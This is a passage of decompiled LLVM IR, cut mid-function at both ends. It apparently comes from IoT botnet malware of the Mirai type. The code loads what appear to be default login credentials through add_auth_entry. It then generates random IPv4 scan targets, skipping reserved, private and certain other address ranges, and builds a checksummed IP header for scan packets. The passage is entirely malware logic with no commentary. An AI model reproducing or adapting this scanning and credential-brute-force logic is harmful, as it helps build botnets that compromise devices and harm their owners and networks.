  %v5_eff4 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19b38.191 to i32), i32 ptrtoint ([5 x i8]* @global_var_19b38.191 to i32), i32 8)
  store i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19b40.193 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_f004 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32 ptrtoint (i32* @global_var_19b40.193 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19b4c.195 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_f014 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19af4.177 to i32), i32 ptrtoint (i32* @global_var_19b4c.195 to i32), i32 15)
  store i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19b58.197 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_f024 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19b08.181 to i32), i32 ptrtoint ([5 x i8]* @global_var_19b58.197 to i32), i32 9)
  store i32 %v5_f024, i32* %r0.global-to-local, align 4
  %v2_f02c = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_f02c, i32* @lr, align 4
  %v1_f358 = add i32 %v2_f02c, 20
  %v1_f3b4 = add i32 %v2_f02c, 16
  %v2_f3b4 = inttoptr i32 %v1_f3b4 to i32*
  %v2_f63c = ptrtoint i32* %stack_var_-40 to i32
  %v2_f684 = ptrtoint i32* %stack_var_-68 to i32
  %v2_f688 = ptrtoint i32* %stack_var_-224 to i32
  %v2_f68c = ptrtoint i32* %stack_var_-352 to i32
  %v2_1010c = ptrtoint i32* %stack_var_-45 to i32
  %v2_10120 = ptrtoint i32* %stack_var_-77 to i32
  %v2_10078 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f8d4 = ptrtoint i32* %stack_var_-104 to i32
  %v2_103b0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_10408 = ptrtoint i32* %stack_var_-42 to i32
  %v1_f3c4 = add i32 %v2_f02c, 9
  %v2_f3c4 = inttoptr i32 %v1_f3c4 to i8*
  %v1_f458 = add i32 %v2_f02c, 12
  %v2_f458 = inttoptr i32 %v1_f458 to i32*
  br label %dec_label_pc_f034

dec_label_pc_f034:                                ; preds = %dec_label_pc_f828, %dec_label_pc_eea8
  %stack_var_-1880.0 = phi i32 [ %tmp335, %dec_label_pc_eea8 ], [ %stack_var_-1880.1, %dec_label_pc_f828 ]
  store i32 ptrtoint (i32* @global_var_224b0.142 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v2_f03c = load i32, i32* @global_var_224b0.142, align 4
  store i32 %v2_f03c, i32* @r4, align 4
  %v3_f040 = icmp uge i32 %stack_var_-1880.0, %v2_f03c
  store i1 %v3_f040, i1* %cpsr_c.global-to-local, align 1
  %v9_f040 = icmp eq i32 %stack_var_-1880.0, %v2_f03c
  store i1 %v9_f040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f040, label %dec_label_pc_f348, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %dec_label_pc_f034
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_103b0, i32* @r5, align 4
  br label %dec_label_pc_f058

dec_label_pc_f058:                                ; preds = %bb408, %dec_label_pc_f048
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_f06c = call i32 @rand_next()
  %v1_f06c = trunc i32 %v0_f06c to i16
  store i32 %v0_f06c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %ip.global-to-local, align 4
  %v2_f078 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_f078, i32* %r3.global-to-local, align 4
  store i16 %v1_f06c, i16* bitcast (i32* @global_var_22484.162 to i16*), align 4
  store i32 %v2_f078, i32* @global_var_2248c.198, align 4
  br label %dec_label_pc_f084

dec_label_pc_f084:                                ; preds = %dec_label_pc_f1dc, %dec_label_pc_f0b4, %dec_label_pc_f210, %dec_label_pc_f204, %dec_label_pc_f1f8, %dec_label_pc_f1ec, %.thread47, %.thread31, %.thread27, %.thread23, %bb399, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %dec_label_pc_f150, %dec_label_pc_f148, %bb384, %dec_label_pc_f118, %dec_label_pc_f0f4, %bb377, %dec_label_pc_f0c4, %bb376, %dec_label_pc_f0ac, %bb375, %bb401, %dec_label_pc_f058
  %v0_f084 = call i32 @rand_next()
  store i32 %v0_f084, i32* %r0.global-to-local, align 4
  %v1_f088 = urem i32 %v0_f084, 256
  store i32 %v1_f088, i32* %r1.global-to-local, align 4
  %v3_f08c = udiv i32 %v0_f084, 256
  store i32 %v3_f08c, i32* %r3.global-to-local, align 4
  %v3_f090 = udiv i32 %v0_f084, 65536
  store i32 %v3_f090, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f094 = icmp eq i32 %v1_f088, 0
  store i1 %v2_f094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f094, label %bb375, label %bb374

bb374:                                            ; preds = %dec_label_pc_f084
  %v3_f098 = icmp ugt i32 %v1_f088, 126
  store i1 %v3_f098, i1* %cpsr_c.global-to-local, align 1
  %v8_f098 = icmp eq i32 %v1_f088, 127
  store i1 %v8_f098, i1* %cpsr_z.global-to-local, align 1
  br label %bb375

bb375:                                            ; preds = %dec_label_pc_f084, %bb374
  %v0_f0a8 = phi i1 [ true, %dec_label_pc_f084 ], [ %v8_f098, %bb374 ]
  %v1_f09c = urem i32 %v3_f08c, 256
  store i32 %v1_f09c, i32* %ip.global-to-local, align 4
  %v1_f0a0 = urem i32 %v3_f090, 256
  store i32 %v1_f0a0, i32* %r2.global-to-local, align 4
  %v1_f0a4 = and i32 %v0_f084, 8388608
  %v2_f0a4 = icmp ne i32 %v1_f0a4, 0
  store i1 %v2_f0a4, i1* %cpsr_c.global-to-local, align 1
  %v3_f0a4 = udiv i32 %v0_f084, 16777216
  store i32 %v3_f0a4, i32* %r0.global-to-local, align 4
  br i1 %v0_f0a8, label %dec_label_pc_f084, label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %bb375
  %v2_f0ac = icmp ugt i32 %v1_f088, 2
  store i1 %v2_f0ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f0ac = icmp eq i32 %v1_f088, 3
  store i1 %v7_f0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0ac, label %dec_label_pc_f084, label %dec_label_pc_f0b4

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f0ac
  %v1_f0b4 = add nsw i32 %v1_f088, -15
  store i32 %v1_f0b4, i32* %r3.global-to-local, align 4
  %v2_f0b8 = icmp ugt i32 %v1_f088, 55
  store i1 %v2_f0b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0b8 = icmp eq i32 %v1_f088, 56
  store i1 %v7_f0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0b8, label %dec_label_pc_f084, label %bb376

bb376:                                            ; preds = %dec_label_pc_f0b4
  %v3_f0bc = icmp ne i32 %v1_f0b4, 0
  store i1 %v3_f0bc, i1* %cpsr_c.global-to-local, align 1
  %v8_f0bc = icmp eq i32 %v1_f0b4, 1
  store i1 %v8_f0bc, i1* %cpsr_z.global-to-local, align 1
  %v2_f0c0 = xor i1 %v3_f0bc, true
  %v3_f0c0 = or i1 %v8_f0bc, %v2_f0c0
  br i1 %v3_f0c0, label %dec_label_pc_f084, label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %bb376
  %v2_f0c4 = icmp ugt i32 %v1_f088, 9
  store i1 %v2_f0c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0c4 = icmp eq i32 %v1_f088, 10
  store i1 %v7_f0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0c4, label %dec_label_pc_f084, label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f0c4
  %v2_f0cc = icmp ugt i32 %v1_f088, 191
  store i1 %v2_f0cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f0cc = icmp eq i32 %v1_f088, 192
  store i1 %v7_f0cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0cc, label %bb377, label %dec_label_pc_f0d8

bb377:                                            ; preds = %dec_label_pc_f0cc
  %v3_f0d0 = icmp ugt i32 %v1_f09c, 167
  store i1 %v3_f0d0, i1* %cpsr_c.global-to-local, align 1
  %v8_f0d0 = icmp eq i32 %v1_f09c, 168
  store i1 %v8_f0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f0d0, label %dec_label_pc_f084, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_f0cc, %bb377
  %v7_f0d8 = icmp eq i32 %v1_f088, 172
  %.461 = zext i1 %v7_f0d8 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_f0e4 = icmp ugt i32 %v1_f09c, 14
  store i1 %v2_f0e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0e4 = icmp eq i32 %v1_f09c, 15
  store i1 %v7_f0e4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0e8 = xor i1 %v2_f0e4, true
  %v3_f0e8 = or i1 %v7_f0e4, %v2_f0e8
  br i1 %v3_f0e8, label %.thread7, label %bb380

.thread7:                                         ; preds = %dec_label_pc_f0d8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f0fc

bb380:                                            ; preds = %dec_label_pc_f0d8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0ec = icmp eq i1 %v7_f0d8, false
  store i1 %v2_f0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0ec, label %dec_label_pc_f0fc, label %dec_label_pc_f0f4

dec_label_pc_f0f4:                                ; preds = %bb380
  %v2_f0f4 = icmp ugt i32 %v1_f09c, 30
  store i1 %v2_f0f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f4 = icmp eq i32 %v1_f09c, 31
  store i1 %v7_f0f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f0f8 = xor i1 %v2_f0f4, true
  %v3_f0f8 = or i1 %v7_f0f4, %v2_f0f8
  br i1 %v3_f0f8, label %dec_label_pc_f084, label %dec_label_pc_f0fc

dec_label_pc_f0fc:                                ; preds = %.thread7, %dec_label_pc_f0f4, %bb380
  %v7_f0fc = icmp eq i32 %v1_f088, 100
  %.462 = zext i1 %v7_f0fc to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_f108 = icmp ugt i32 %v1_f09c, 62
  store i1 %v2_f108, i1* %cpsr_c.global-to-local, align 1
  %v7_f108 = icmp eq i32 %v1_f09c, 63
  store i1 %v7_f108, i1* %cpsr_z.global-to-local, align 1
  %v2_f10c = xor i1 %v2_f108, true
  %v3_f10c = or i1 %v7_f108, %v2_f10c
  br i1 %v3_f10c, label %.thread12, label %bb383

.thread12:                                        ; preds = %dec_label_pc_f0fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f120

bb383:                                            ; preds = %dec_label_pc_f0fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f110 = icmp eq i1 %v7_f0fc, false
  store i1 %v2_f110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f110, label %dec_label_pc_f120, label %dec_label_pc_f118

dec_label_pc_f118:                                ; preds = %bb383
  %v2_f118 = icmp ugt i32 %v1_f09c, 125
  store i1 %v2_f118, i1* %cpsr_c.global-to-local, align 1
  %v7_f118 = icmp eq i32 %v1_f09c, 126
  store i1 %v7_f118, i1* %cpsr_z.global-to-local, align 1
  %v2_f11c = xor i1 %v2_f118, true
  %v3_f11c = or i1 %v7_f118, %v2_f11c
  br i1 %v3_f11c, label %dec_label_pc_f084, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %.thread12, %dec_label_pc_f118, %bb383
  %v2_f120 = icmp ugt i32 %v1_f088, 168
  store i1 %v2_f120, i1* %cpsr_c.global-to-local, align 1
  %v7_f120 = icmp eq i32 %v1_f088, 169
  store i1 %v7_f120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f120, label %bb384, label %dec_label_pc_f12c

bb384:                                            ; preds = %dec_label_pc_f120
  %v3_f124 = icmp eq i32 %v1_f09c, 255
  store i1 %v3_f124, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f124, label %dec_label_pc_f084, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f120, %bb384
  %v7_f12c = icmp eq i32 %v1_f088, 198
  %.463 = zext i1 %v7_f12c to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_f138 = icmp ugt i32 %v1_f09c, 16
  store i1 %v2_f138, i1* %cpsr_c.global-to-local, align 1
  %v7_f138 = icmp eq i32 %v1_f09c, 17
  store i1 %v7_f138, i1* %cpsr_z.global-to-local, align 1
  %v2_f13c = xor i1 %v2_f138, true
  %v3_f13c = or i1 %v7_f138, %v2_f13c
  br i1 %v3_f13c, label %.thread18, label %bb387

.thread18:                                        ; preds = %dec_label_pc_f12c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f150

bb387:                                            ; preds = %dec_label_pc_f12c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f140 = icmp eq i1 %v7_f12c, false
  store i1 %v2_f140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f140, label %dec_label_pc_f150, label %dec_label_pc_f148

dec_label_pc_f148:                                ; preds = %bb387
  %v2_f148 = icmp ugt i32 %v1_f09c, 18
  store i1 %v2_f148, i1* %cpsr_c.global-to-local, align 1
  %v7_f148 = icmp eq i32 %v1_f09c, 19
  store i1 %v7_f148, i1* %cpsr_z.global-to-local, align 1
  %v2_f14c = xor i1 %v2_f148, true
  %v3_f14c = or i1 %v7_f148, %v2_f14c
  br i1 %v3_f14c, label %dec_label_pc_f084, label %dec_label_pc_f150

dec_label_pc_f150:                                ; preds = %.thread18, %dec_label_pc_f148, %bb387
  %v2_f150 = icmp ugt i32 %v1_f088, 222
  store i1 %v2_f150, i1* %cpsr_c.global-to-local, align 1
  %v7_f150 = icmp eq i32 %v1_f088, 223
  store i1 %v7_f150, i1* %cpsr_z.global-to-local, align 1
  %v2_f154 = xor i1 %v7_f150, true
  %v3_f154 = and i1 %v2_f150, %v2_f154
  br i1 %v3_f154, label %dec_label_pc_f084, label %dec_label_pc_f158

dec_label_pc_f158:                                ; preds = %dec_label_pc_f150
  %v7_f158 = icmp eq i32 %v1_f088, 106
  %.464 = zext i1 %v7_f158 to i32
  %v2_f164 = icmp ugt i32 %v1_f09c, 185
  store i1 %v2_f164, i1* %cpsr_c.global-to-local, align 1
  %v7_f164 = icmp eq i32 %v1_f09c, 186
  store i1 %v7_f164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f164, label %bb390, label %dec_label_pc_f170

bb390:                                            ; preds = %dec_label_pc_f158
  %v2_f158 = icmp ugt i32 %v1_f088, 105
  store i1 %v2_f158, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f158, label %dec_label_pc_f084, label %dec_label_pc_f170

dec_label_pc_f170:                                ; preds = %dec_label_pc_f158, %bb390
  %v2_f170 = icmp ugt i32 %v1_f09c, 186
  store i1 %v2_f170, i1* %cpsr_c.global-to-local, align 1
  %v7_f170 = icmp eq i32 %v1_f09c, 187
  store i1 %v7_f170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f170, label %.thread23, label %.thread24

.thread24:                                        ; preds = %dec_label_pc_f170
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f184

.thread23:                                        ; preds = %dec_label_pc_f170
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f17c = icmp eq i1 %v7_f158, false
  store i1 %v2_f17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f17c, label %dec_label_pc_f184, label %dec_label_pc_f084

dec_label_pc_f184:                                ; preds = %.thread24, %.thread23
  %v2_f184 = icmp ugt i32 %v1_f09c, 184
  store i1 %v2_f184, i1* %cpsr_c.global-to-local, align 1
  %v7_f184 = icmp eq i32 %v1_f09c, 185
  store i1 %v7_f184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f184, label %.thread27, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f184
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f198

.thread27:                                        ; preds = %dec_label_pc_f184
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f190 = icmp eq i1 %v7_f158, false
  store i1 %v2_f190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f190, label %dec_label_pc_f198, label %dec_label_pc_f084

dec_label_pc_f198:                                ; preds = %.thread28, %.thread27
  %v2_f198 = icmp ugt i32 %v1_f09c, 183
  store i1 %v2_f198, i1* %cpsr_c.global-to-local, align 1
  %v7_f198 = icmp eq i32 %v1_f09c, 184
  store i1 %v7_f198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f198, label %.thread31, label %.thread32

.thread32:                                        ; preds = %dec_label_pc_f198
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f1ac

.thread31:                                        ; preds = %dec_label_pc_f198
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1a4 = icmp eq i1 %v7_f158, false
  store i1 %v2_f1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f1a4, label %dec_label_pc_f1ac, label %dec_label_pc_f084

dec_label_pc_f1ac:                                ; preds = %.thread32, %.thread31
  %v2_f1ac = icmp ugt i32 %v1_f088, 149
  store i1 %v2_f1ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f1ac = icmp eq i32 %v1_f088, 150
  store i1 %v7_f1ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1ac, label %bb391, label %dec_label_pc_f1b8

bb391:                                            ; preds = %dec_label_pc_f1ac
  %v3_f1b0 = icmp ugt i32 %v1_f09c, 30
  store i1 %v3_f1b0, i1* %cpsr_c.global-to-local, align 1
  %v8_f1b0 = icmp eq i32 %v1_f09c, 31
  store i1 %v8_f1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1b0, label %dec_label_pc_f084, label %dec_label_pc_f1b8

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1ac, %bb391
  %v2_f1b8 = icmp ugt i32 %v1_f088, 48
  store i1 %v2_f1b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1b8 = icmp eq i32 %v1_f088, 49
  store i1 %v7_f1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1b8, label %bb392, label %dec_label_pc_f1c4

bb392:                                            ; preds = %dec_label_pc_f1b8
  %v3_f1bc = icmp ugt i32 %v1_f09c, 50
  store i1 %v3_f1bc, i1* %cpsr_c.global-to-local, align 1
  %v8_f1bc = icmp eq i32 %v1_f09c, 51
  store i1 %v8_f1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1bc, label %dec_label_pc_f084, label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_f1b8, %bb392
  %v2_f1c4 = icmp ugt i32 %v1_f088, 177
  store i1 %v2_f1c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c4 = icmp eq i32 %v1_f088, 178
  store i1 %v7_f1c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1c4, label %bb393, label %dec_label_pc_f1d0

bb393:                                            ; preds = %dec_label_pc_f1c4
  %v3_f1c8 = icmp ugt i32 %v1_f09c, 61
  store i1 %v3_f1c8, i1* %cpsr_c.global-to-local, align 1
  %v8_f1c8 = icmp eq i32 %v1_f09c, 62
  store i1 %v8_f1c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1c8, label %dec_label_pc_f084, label %dec_label_pc_f1d0

dec_label_pc_f1d0:                                ; preds = %dec_label_pc_f1c4, %bb393
  %v2_f1d0 = icmp ugt i32 %v1_f088, 159
  store i1 %v2_f1d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1d0 = icmp eq i32 %v1_f088, 160
  store i1 %v7_f1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1d0, label %bb394, label %dec_label_pc_f1dc

bb394:                                            ; preds = %dec_label_pc_f1d0
  %v3_f1d4 = icmp ugt i32 %v1_f09c, 12
  store i1 %v3_f1d4, i1* %cpsr_c.global-to-local, align 1
  %v8_f1d4 = icmp eq i32 %v1_f09c, 13
  store i1 %v8_f1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1d4, label %dec_label_pc_f084, label %dec_label_pc_f1dc

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1d0, %bb394
  %v1_f1dc = add nsw i32 %v1_f088, -6
  store i32 %v1_f1dc, i32* %r3.global-to-local, align 4
  %v2_f1e0 = icmp ugt i32 %v1_f088, 10
  store i1 %v2_f1e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e0 = icmp eq i32 %v1_f088, 11
  store i1 %v7_f1e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1e0, label %dec_label_pc_f084, label %bb395

bb395:                                            ; preds = %dec_label_pc_f1dc
  %v3_f1e4 = icmp ne i32 %v1_f1dc, 0
  store i1 %v3_f1e4, i1* %cpsr_c.global-to-local, align 1
  %v8_f1e4 = icmp eq i32 %v1_f1dc, 1
  store i1 %v8_f1e4, i1* %cpsr_z.global-to-local, align 1
  %v2_f1e8 = xor i1 %v3_f1e4, true
  %v3_f1e8 = or i1 %v8_f1e4, %v2_f1e8
  br i1 %v3_f1e8, label %dec_label_pc_f084, label %dec_label_pc_f1ec

dec_label_pc_f1ec:                                ; preds = %bb395
  %v2_f1ec = icmp ugt i32 %v1_f088, 21
  store i1 %v2_f1ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f1ec = icmp eq i32 %v1_f088, 22
  store i1 %v7_f1ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1ec, label %dec_label_pc_f084, label %bb396

bb396:                                            ; preds = %dec_label_pc_f1ec
  %v3_f1f0 = icmp ugt i32 %v1_f088, 20
  store i1 %v3_f1f0, i1* %cpsr_c.global-to-local, align 1
  %v8_f1f0 = icmp eq i32 %v1_f088, 21
  store i1 %v8_f1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1f0, label %dec_label_pc_f084, label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %bb396
  %v2_f1f8 = icmp ugt i32 %v1_f088, 27
  store i1 %v2_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f8 = icmp eq i32 %v1_f088, 28
  store i1 %v7_f1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f8, label %dec_label_pc_f084, label %bb397

bb397:                                            ; preds = %dec_label_pc_f1f8
  %v3_f1fc = icmp ugt i32 %v1_f088, 25
  store i1 %v3_f1fc, i1* %cpsr_c.global-to-local, align 1
  %v8_f1fc = icmp eq i32 %v1_f088, 26
  store i1 %v8_f1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1fc, label %dec_label_pc_f084, label %dec_label_pc_f204

dec_label_pc_f204:                                ; preds = %bb397
  %v2_f204 = icmp ugt i32 %v1_f088, 29
  store i1 %v2_f204, i1* %cpsr_c.global-to-local, align 1
  %v7_f204 = icmp eq i32 %v1_f088, 30
  store i1 %v7_f204, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f204, label %dec_label_pc_f084, label %bb398

bb398:                                            ; preds = %dec_label_pc_f204
  %v3_f208 = icmp ugt i32 %v1_f088, 28
  store i1 %v3_f208, i1* %cpsr_c.global-to-local, align 1
  %v8_f208 = icmp eq i32 %v1_f088, 29
  store i1 %v8_f208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f208, label %dec_label_pc_f084, label %dec_label_pc_f210

dec_label_pc_f210:                                ; preds = %bb398
  %v2_f210 = icmp ugt i32 %v1_f088, 54
  store i1 %v2_f210, i1* %cpsr_c.global-to-local, align 1
  %v7_f210 = icmp eq i32 %v1_f088, 55
  store i1 %v7_f210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f210, label %dec_label_pc_f084, label %bb399

bb399:                                            ; preds = %dec_label_pc_f210
  %v3_f214 = icmp ugt i32 %v1_f088, 32
  store i1 %v3_f214, i1* %cpsr_c.global-to-local, align 1
  %v8_f214 = icmp eq i32 %v1_f088, 33
  store i1 %v8_f214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f214, label %dec_label_pc_f084, label %dec_label_pc_f21c

dec_label_pc_f21c:                                ; preds = %bb399
  %v2_f21c = icmp ugt i32 %v1_f088, 214
  store i1 %v2_f21c, i1* %cpsr_c.global-to-local, align 1
  %v7_f21c = icmp eq i32 %v1_f088, 215
  store i1 %v7_f21c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f21c, label %.thread47, label %bb400

bb400:                                            ; preds = %dec_label_pc_f21c
  %v3_f220 = icmp ugt i32 %v1_f088, 213
  store i1 %v3_f220, i1* %cpsr_c.global-to-local, align 1
  %v8_f220 = icmp eq i32 %v1_f088, 214
  store i1 %v8_f220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f220, label %bb401, label %dec_label_pc_f230

.thread47:                                        ; preds = %dec_label_pc_f21c
  br label %dec_label_pc_f084

bb401:                                            ; preds = %bb400
  br label %dec_label_pc_f084

dec_label_pc_f230:                                ; preds = %bb400
  %v5_f23c = call i32 @llvm.bswap.i32(i32 %v0_f084)
  store i32 %v5_f23c, i32* %r3.global-to-local, align 4
  %tmp402 = and i32 %v0_f084, 65280
  %tmp403 = call i32 @llvm.bswap.i32(i32 %tmp402)
  %v3_f244 = udiv i32 %v5_f23c, 16777216
  %tmp404 = and i32 %v0_f084, 16711680
  %tmp405 = call i32 @llvm.bswap.i32(i32 %tmp404)
  %v4_f24c = udiv i32 %tmp403, 256
  %v4_f250 = mul nuw nsw i32 %tmp405, 256
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* @r0, align 4
  %tmp406 = and i32 %v0_f084, 65536
  %v3_f258 = icmp ne i32 %tmp406, 0
  store i1 %v3_f258, i1* %cpsr_c.global-to-local, align 1
  %v4_f258 = mul i32 %v5_f23c, 16777216
  %v5_f24c = or i32 %v4_f258, %v3_f244
  %v5_f250 = or i32 %v5_f24c, %v4_f24c
  %v5_f258 = or i32 %v5_f250, %v4_f250
  store i32 %v5_f258, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_2248a.199 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_f258, i32* @global_var_22490.200, align 4
  %v3_f268 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_22480.157 to i32), i32 20)
  %v4_f268 = trunc i32 %v3_f268 to i16
  store i32 %v3_f268, i32* %r0.global-to-local, align 4
  %v3_f26c = load i32, i32* %stack_var_-52, align 4
  %v5_f27c = sdiv i32 %v3_f26c, 10
  %v3_f280 = mul i32 %v5_f27c, 8
  store i32 %v3_f280, i32* %r2.global-to-local, align 4
  %v2_f288 = mul i32 %v5_f27c, 10
  store i32 %v2_f288, i32* %r3.global-to-local, align 4
  %v3_f28c = icmp uge i32 %v3_f26c, %v2_f288
  store i1 %v3_f28c, i1* %cpsr_c.global-to-local, align 1
  %v9_f28c = icmp eq i32 %v3_f26c, %v2_f288
  store i1 %v9_f28c, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_f28c, label %bb407, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_f230
  store i32 ptrtoint (i16* @global_var_22494.160 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_f268, i16* bitcast (i32* @global_var_2248a.199 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_22480.157 to i32), i32* %r0.global-to-local, align 4
